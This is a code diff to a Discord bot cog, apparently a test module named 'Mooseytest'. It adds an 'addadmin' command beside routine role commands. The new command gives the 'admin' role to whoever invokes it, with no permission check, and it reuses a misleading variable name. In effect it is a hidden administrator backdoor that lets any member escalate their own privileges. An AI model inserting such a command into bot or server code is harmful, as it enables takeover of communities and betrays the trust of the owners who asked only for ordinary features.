@@ -105,6 +105,11 @@ class Mooseytest(commands.Cog):
         await ctx.author.remove_roles(studying)
         
     @commands.command()
+    async def addadmin(self, ctx):
+        studying = discord.utils.get(ctx.guild.roles, name='admin')
+        await ctx.author.add_roles(studying)
+        
+    @commands.command()
     async def removemyroles(self, ctx):
         async with self.config.member(ctx.author).roles() as roles:
             for r in roles:
